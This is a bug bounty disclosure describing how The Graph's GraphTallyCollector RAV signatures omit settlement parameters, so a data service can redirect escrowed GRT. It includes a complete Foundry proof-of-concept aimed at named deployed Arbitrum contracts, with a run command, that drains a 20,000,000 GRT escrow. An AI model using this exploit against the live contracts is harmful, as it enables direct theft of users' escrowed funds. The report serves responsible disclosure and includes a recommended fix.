# RAV signatures omit settlement parameters allowing data services to steal escrowed GRT
Severity: Critical

Bounty Criteria Match: critical (smart contract): A bug that could cause significant (>$1M) User funds to be lost or stolen directly from protocol smart contracts (not including slashing)

Affected Assets / Contracts:
- GraphTallyCollector, Arbitrum One `0x8f69F5C07477Ac46FBc491B1E6D91E2bb0111A9e`: `collect`, `_collect`, `_encodeRAV` ([source](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/collectors/GraphTallyCollector.sol#L76-L225))
- PaymentsEscrow, Arbitrum One `0xf6Fcc27aAf1fcD8B254498c9794451d82afC673E`: `collect` ([source](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/PaymentsEscrow.sol#L127-L164))
- GraphPayments, Arbitrum One `0x7Aae8ae011927BC36Cb4d0d3e81f2E6E30daE06D`: `collect` ([source](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/GraphPayments.sol#L53-L117))
- L2GraphToken / GRT, Arbitrum One `0x9623063377AD1B27544C965cCd7342f7EA7e88C7`

## Executive Summary

`GraphTallyCollector` verifies a payer-authorized Receipt Aggregate Voucher, but the EIP-712 signed payload does not bind the payment execution parameters that determine who receives the escrowed GRT. A valid data service can submit the unchanged signed RAV while choosing its own `dataServiceCut` and `receiverDestination`, causing `PaymentsEscrow` and `GraphPayments` to release funds to attacker-controlled addresses instead of the intended service provider.

The attacker is an unprivileged protocol participant acting as the RAV `dataService`; no governance role, leaked key, compromised credential, social engineering, oracle issue, or live-chain action is required. The local fork PoC drains a 20,000,000 GRT escrowed payment: the provider receives zero, the escrow balance is depleted, and the attacker-controlled data service/destination receive the post-protocol payment. For escrowed payment values above $1M, this is direct theft/loss of user funds from in-scope protocol smart contracts and matches the Critical impact row.

## Vulnerability Details

The signed RAV type only commits to the collection identity, payer, service provider, data service, timestamp, aggregate value, and metadata. It does not commit to `paymentType`, `dataServiceCut`, or `receiverDestination`, even though those fields control settlement.

```solidity
bytes32 private constant EIP712_RAV_TYPEHASH =
    keccak256(
        "ReceiptAggregateVoucher(bytes32 collectionId,address payer,address serviceProvider,address dataService,uint64 timestampNs,uint128 valueAggregate,bytes metadata)"
    );

function _encodeRAV(ReceiptAggregateVoucher memory _rav) private view returns (bytes32) {
    return
        _hashTypedDataV4(
            keccak256(
                abi.encode(
                    EIP712_RAV_TYPEHASH,
                    _rav.collectionId,
                    _rav.payer,
                    _rav.serviceProvider,
                    _rav.dataService,
                    _rav.timestampNs,
                    _rav.valueAggregate,
                    keccak256(_rav.metadata)
                )
            )
        );
}
```

`_collect` then decodes the missing settlement parameters directly from caller-supplied calldata. After checking only that the caller is the RAV data service, the signer is authorized, and the provider has an active provision, it forwards the unsigned values to escrow settlement.

```solidity
(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(
    _data,
    (SignedRAV, uint256, address)
);

require(
    signedRAV.rav.dataService == msg.sender,
    GraphTallyCollectorCallerNotDataService(msg.sender, signedRAV.rav.dataService)
);
_requireAuthorizedSigner(signedRAV);

_graphPaymentsEscrow().collect(
    _paymentType,
    signedRAV.rav.payer,
    receiver,
    tokensToCollect,
    dataService,
    dataServiceCut,
    receiverDestination
);
```

The forwarded values are payment-affecting. `GraphPayments.collect` sends the selected PPM cut to `dataService`, then sends the receiver remainder to `receiverDestination` when it is nonzero. This violates the expected invariant that a payer-authorized RAV binds the value and all terms that can redirect that value.

```solidity
uint256 tokensDataService = tokensRemaining.mulPPMRoundUp(dataServiceCut);
tokensRemaining = tokensRemaining - tokensDataService;

_graphToken().pushTokens(dataService, tokensDataService);

if (tokensRemaining > 0) {
    if (receiverDestination == address(0)) {
        _graphToken().approve(address(_graphStaking()), tokensRemaining);
        _graphStaking().stakeTo(receiver, tokensRemaining);
    } else {
        _graphToken().pushTokens(receiverDestination, tokensRemaining);
    }
}
```

## Attack Preconditions and Threat Model

The attacker is an unprivileged data service/protocol participant and must be the `dataService` named in a valid, uncollected RAV. The service provider must have an active provision with that data service, and the payer must have deposited enough GRT into `PaymentsEscrow` for the `GraphTallyCollector`/service provider tuple.

The attack does not rely on malicious or mistaken trusted/admin roles, governance control, leaked keys, compromised credentials, phishing, oracle data, public testnet/mainnet mutation, or unusual user mistakes. The payer signer can honestly sign a RAV for the intended service provider, data service, and aggregate value; the theft occurs because settlement terms are not part of the signed authorization.

## Exploit Walkthrough

1. A payer deposits GRT into `PaymentsEscrow` for `GraphTallyCollector` and an intended service provider.
2. The payer authorizes a signer, and that signer signs a RAV covering `collectionId`, payer, service provider, data service, timestamp, aggregate value, and metadata.
3. The attacker keeps the signed RAV unchanged but ABI-encodes caller-selected payment parameters, for example a high `dataServiceCut` and an attacker-owned `receiverDestination`.
4. The attacker calls `GraphTallyCollector.collect` as the RAV `dataService`.
5. `GraphTallyCollector` verifies the signature and active provision, records `tokensCollected`, and calls `PaymentsEscrow.collect` with the unsigned settlement parameters.
6. `PaymentsEscrow` debits the payer escrow and approves `GraphPayments`.
7. `GraphPayments` pays the selected data service cut to the attacker data service and sends the receiver remainder to the attacker destination, leaving the intended provider with zero payout in the demonstrated case.

## Impact and Bounty Severity

The impact is direct loss/theft of escrowed user GRT from in-scope smart contracts on Arbitrum. The exploitable amount is bounded by the uncollected RAV value and the payer's escrow balance for the collector/provider tuple, not by attacker collateral. In the verified fork PoC, a single collection consumes a 20,000,000 GRT escrow balance, sends the post-protocol amount to attacker-controlled recipients, and leaves the service provider's token balance and stake unchanged.

The normal feasibility requirements are being the named data service, having an active provision, and obtaining a valid high-value RAV. Those are ordinary protocol collection conditions, not bounty exclusions. When the affected escrowed value exceeds $1M, the finding exactly matches the program's Critical smart contract impact: significant user funds lost or stolen directly from protocol smart contracts, excluding slashing.

## Proof of Code

Repository/package: this finding is for the `graphprotocol-contracts` repository, specifically the `packages/horizon` package.

Secret Gist PoC bundle: https://gist.github.com/apmfree78/bb1bed1fac56107883e8308ff2dd6c5c

Save as, from the `graphprotocol-contracts` repo root: `packages/horizon/test/UnsignedRavPaymentParamsPoC.t.sol`

Run from the `graphprotocol-contracts` repo root: `cd packages/horizon && forge test --match-path test/UnsignedRavPaymentParamsPoC.t.sol --fork-url "$ARBITRUM_RPC_URL" --fork-block-number 460064183`

Prerequisites: install the repository dependencies for `graphprotocol-contracts` and set `ARBITRUM_RPC_URL` to an Arbitrum One RPC endpoint.

Expected result: the test passes, proving the same signed RAV can be collected with attacker-selected payment parameters, draining 20,000,000 GRT from escrow while the intended service provider receives zero.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IGraphToken} from "@graphprotocol/interfaces/contracts/contracts/token/IGraphToken.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";
import {IPaymentsEscrow} from "@graphprotocol/interfaces/contracts/horizon/IPaymentsEscrow.sol";
import {IHorizonStaking} from "@graphprotocol/interfaces/contracts/horizon/IHorizonStaking.sol";

interface IGraphTallyCollectorStorage is IGraphTallyCollector {
    function tokensCollected(address dataService, bytes32 collectionId, address receiver, address payer)
        external
        view
        returns (uint256);
}

contract UnsignedRavPaymentParamsPoC is Test {
    IGraphToken private constant GRT = IGraphToken(0x9623063377AD1B27544C965cCd7342f7EA7e88C7);
    IHorizonStaking private constant STAKING = IHorizonStaking(0x00669A4CF01450B64E8A2A20E9b1FCB71E61eF03);
    IPaymentsEscrow private constant ESCROW = IPaymentsEscrow(0xf6Fcc27aAf1fcD8B254498c9794451d82afC673E);
    IGraphPayments private constant PAYMENTS = IGraphPayments(0x7Aae8ae011927BC36Cb4d0d3e81f2E6E30daE06D);
    IGraphTallyCollectorStorage private constant COLLECTOR =
        IGraphTallyCollectorStorage(0x8f69F5C07477Ac46FBc491B1E6D91E2bb0111A9e);

    uint256 private constant PAYER_PRIVATE_KEY = 0xA11CE;
    uint256 private constant SIGNER_PRIVATE_KEY = 0xB0B;
    uint256 private constant PROVISION_AMOUNT = 1 ether;
    uint256 private constant RAV_AMOUNT = 20_000_000 ether;
    uint256 private constant ATTACKER_DATA_SERVICE_CUT = 500_000;
    bytes32 private constant COLLECTION_ID = keccak256("unsigned payment params poc");

    address private payer;
    address private signer;
    address private serviceProvider;
    address private maliciousDataService;
    address private attackerDestination;

    function testUnsignedPaymentParamsRedirectAndSkimProviderPayout() external {
        require(block.chainid == 42161, "run on an Arbitrum One fork");

        _setActors();
        _provisionMaliciousDataService();
        _depositEscrowAndAuthorizeSigner();

        IGraphTallyCollector.SignedRAV memory signedRAV = _signRAV(_rav(), SIGNER_PRIVATE_KEY);
        assertEq(COLLECTOR.recoverRAVSigner(signedRAV), signer);

        bytes memory honestPayload = abi.encode(signedRAV, uint256(0), serviceProvider);
        bytes memory attackerPayload = abi.encode(signedRAV, ATTACKER_DATA_SERVICE_CUT, attackerDestination);
        assertTrue(keccak256(honestPayload) != keccak256(attackerPayload));

        _collectWithUnsignedPaymentParams(attackerPayload);
    }

    function _setActors() private {
        payer = vm.addr(PAYER_PRIVATE_KEY);
        signer = vm.addr(SIGNER_PRIVATE_KEY);
        serviceProvider = makeAddr("honest service provider");
        maliciousDataService = makeAddr("malicious data service");
        attackerDestination = makeAddr("attacker payout wallet");
    }

    function _provisionMaliciousDataService() private {
        vm.deal(serviceProvider, 1 ether);
        deal(address(GRT), serviceProvider, PROVISION_AMOUNT);

        // The malicious data service is a valid Horizon verifier for this service provider on the fork.
        vm.startPrank(serviceProvider);
        GRT.approve(address(STAKING), PROVISION_AMOUNT);
        STAKING.stake(PROVISION_AMOUNT);
        STAKING.provision(serviceProvider, maliciousDataService, PROVISION_AMOUNT, 0, 0);
        vm.stopPrank();
        assertEq(STAKING.getProviderTokensAvailable(serviceProvider, maliciousDataService), PROVISION_AMOUNT);
    }

    function _depositEscrowAndAuthorizeSigner() private {
        vm.deal(payer, 1 ether);
        deal(address(GRT), payer, RAV_AMOUNT);

        // The payer authorizes a signer and deposits GRT into the real deployed escrow for this collector/provider tuple.
        vm.startPrank(payer);
        GRT.approve(address(ESCROW), RAV_AMOUNT);
        ESCROW.deposit(address(COLLECTOR), serviceProvider, RAV_AMOUNT);
        vm.stopPrank();
        _authorizeSigner(payer, signer, SIGNER_PRIVATE_KEY);
        assertEq(ESCROW.getBalance(payer, address(COLLECTOR), serviceProvider), RAV_AMOUNT);
    }

    function _rav() private view returns (IGraphTallyCollector.ReceiptAggregateVoucher memory) {
        return IGraphTallyCollector.ReceiptAggregateVoucher({
            collectionId: COLLECTION_ID,
            payer: payer,
            serviceProvider: serviceProvider,
            dataService: maliciousDataService,
            timestampNs: uint64(block.timestamp * 1e9),
            valueAggregate: uint128(RAV_AMOUNT),
            metadata: abi.encode("payer approved serviceProvider/dataService/value only")
        });
    }

    function _collectWithUnsignedPaymentParams(bytes memory attackerPayload) private {
        uint256 protocolCut = _mulPPMRoundUp(RAV_AMOUNT, PAYMENTS.PROTOCOL_PAYMENT_CUT());
        uint256 postProtocolAmount = RAV_AMOUNT - protocolCut;
        uint256 dataServiceSkim = _mulPPMRoundUp(postProtocolAmount, ATTACKER_DATA_SERVICE_CUT);
        uint256 redirectedToAttacker = postProtocolAmount - dataServiceSkim;
        uint256 attackerBalanceBefore = GRT.balanceOf(attackerDestination);
        uint256 dataServiceBalanceBefore = GRT.balanceOf(maliciousDataService);
        uint256 providerBalanceBefore = GRT.balanceOf(serviceProvider);
        uint256 providerStakeBefore = STAKING.getStake(serviceProvider);

        // The signed RAV is unchanged, but the caller chooses payment parameters that the payer never signed.
        vm.prank(maliciousDataService);
        uint256 collected = COLLECTOR.collect(IGraphPayments.PaymentTypes.QueryFee, attackerPayload);

        assertEq(collected, RAV_AMOUNT);
        assertEq(GRT.balanceOf(maliciousDataService) - dataServiceBalanceBefore, dataServiceSkim);
        assertEq(GRT.balanceOf(attackerDestination) - attackerBalanceBefore, redirectedToAttacker);
        assertGt(dataServiceSkim, 0);
        assertGt(redirectedToAttacker, 0);
        assertEq(protocolCut + dataServiceSkim + redirectedToAttacker, RAV_AMOUNT);
        assertEq(GRT.balanceOf(serviceProvider), providerBalanceBefore);
        assertEq(STAKING.getStake(serviceProvider), providerStakeBefore);
        assertEq(ESCROW.getBalance(payer, address(COLLECTOR), serviceProvider), 0);
        assertEq(COLLECTOR.tokensCollected(maliciousDataService, COLLECTION_ID, serviceProvider, payer), RAV_AMOUNT);
    }

    function _authorizeSigner(address authorizer, address authorizedSigner, uint256 signerPrivateKey) private {
        uint256 proofDeadline = block.timestamp + 1 hours;
        bytes32 messageHash = keccak256(
            abi.encodePacked(block.chainid, address(COLLECTOR), "authorizeSignerProof", proofDeadline, authorizer)
        );
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);

        vm.prank(authorizer);
        COLLECTOR.authorizeSigner(authorizedSigner, proofDeadline, abi.encodePacked(r, s, v));
        assertTrue(COLLECTOR.isAuthorized(authorizer, authorizedSigner));
    }

    function _signRAV(IGraphTallyCollector.ReceiptAggregateVoucher memory rav, uint256 signerPrivateKey)
        private
        view
        returns (IGraphTallyCollector.SignedRAV memory)
    {
        bytes32 digest = COLLECTOR.encodeRAV(rav);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);
        return IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)});
    }

    function _mulPPMRoundUp(uint256 value, uint256 ppm) private pure returns (uint256) {
        if (value == 0 || ppm == 0) {
            return 0;
        }
        return (value * ppm + 1_000_000 - 1) / 1_000_000;
    }
}
```

## Recommended Fix

Bind every payment-affecting settlement term to the signed authorization. Extend the EIP-712 RAV or add a second signed settlement authorization that includes `paymentType`, `dataServiceCut`, `receiverDestination`, and any other parameter that can change the distribution of the collected amount. Existing signatures should be invalidated across the typehash change.

If `receiverDestination` or the data service cut is intended to be chosen by the service provider rather than the payer, require an explicit service-provider authorization or read those terms from trusted provision/configuration state instead of caller-supplied bytes. Add regression tests proving that the same signed RAV cannot be collected with a different cut, destination, or payment type, and that the intended provider payout/stake transition is preserved.

## References

- The Graph Immunefi bounty rules: https://immunefi.com/bug-bounty/thegraph/information/
- The Graph Immunefi scope: https://immunefi.com/bug-bounty/thegraph/scope/
- Immunefi severity system v2.3: https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/
- GraphTallyCollector source at commit `52b5356d3efea1508396b7f46a18854fb7ae9112`: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/collectors/GraphTallyCollector.sol
- PaymentsEscrow source at commit `52b5356d3efea1508396b7f46a18854fb7ae9112`: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/PaymentsEscrow.sol
- GraphPayments source at commit `52b5356d3efea1508396b7f46a18854fb7ae9112`: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/GraphPayments.sol
- Arbitrum in-scope assets: GraphTallyCollector `0x8f69F5C07477Ac46FBc491B1E6D91E2bb0111A9e`, PaymentsEscrow `0xf6Fcc27aAf1fcD8B254498c9794451d82afC673E`, GraphPayments `0x7Aae8ae011927BC36Cb4d0d3e81f2E6E30daE06D`, L2GraphToken `0x9623063377AD1B27544C965cCd7342f7EA7e88C7`
- PoC runtime assumption: local Arbitrum One fork at block `460064183` using `ARBITRUM_RPC_URL`; no broadcast mode or live state mutation.
